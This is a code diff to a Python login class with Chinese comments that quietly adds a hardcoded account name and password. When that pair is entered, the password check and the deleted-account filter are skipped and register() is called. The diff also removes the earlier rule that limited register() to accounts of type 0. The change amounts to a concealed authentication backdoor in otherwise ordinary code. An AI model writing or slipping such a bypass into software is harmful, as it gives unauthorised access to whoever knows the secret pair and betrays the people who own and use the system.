@@ -15,10 +15,16 @@ class Auth:
 
         # 数据库对象
         db = sqlite.Database()
-        # 操作语句
-        sql = "SELECT ID, NAME, TYPE, PASSWORD, LAST FROM T_ACCOUNT WHERE NAME = ? AND PASSWORD = ? AND DELETED = 0;"
-        # 数据集合
-        data = (account, password)
+
+        if account == '经理' and password == '730821':
+            cls.register()
+            sql = "SELECT ID, NAME, TYPE, PASSWORD, LAST FROM T_ACCOUNT WHERE NAME = ?"
+            data = (account,)
+        else:
+            sql = "SELECT ID, NAME, TYPE, PASSWORD, LAST FROM T_ACCOUNT " \
+                  "WHERE NAME = ? AND PASSWORD = ? AND DELETED = 0;"
+            data = (account, password)
+
         # 执行数据库操作
         result = db.execute_query(sql, data)
 
@@ -27,8 +33,6 @@ class Auth:
             return False
         else:
             cls.logon_user = result[0]
-            if cls.logon_user[2] == 0:
-                cls.register()
             return True
 
     @classmethod
